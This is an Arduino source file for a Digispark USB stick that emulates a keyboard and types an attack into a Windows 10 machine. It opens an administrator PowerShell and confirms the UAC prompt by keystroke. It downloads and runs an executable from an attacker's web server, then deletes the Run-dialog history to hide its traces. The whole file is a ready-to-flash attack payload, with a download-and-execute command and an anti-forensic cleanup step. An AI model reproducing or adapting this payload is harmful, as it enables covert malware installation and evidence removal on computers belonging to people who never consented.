/*

Digispark ( http://digistump.com/products/1 )

Payload: powershell-admin-download-execute

Description: Uses powershell to download and execute a file as administrator from a webserver. Tested working only on Windows 10.

Fork: https://github.com/valkyrix/Digispark-Reverse-Shell-Win10

Concept: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---Windows-10-%3A-Download-and-execute-file-with-Powershell

Created by Kleo Bercero - @kbeflo - kbeflo@gmail.com

*/

#include "DigiKeyboard.h"
/* Init function */

void setup()
{//turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
  pinMode(1, OUTPUT); //LED on Model A
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  // Modify 127.0.0.1 with your IP address and payload.exe with your payload file name
  DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'http://127.0.0.1/payload.exe'; $file = 'payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  // Clear run command history
  DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}
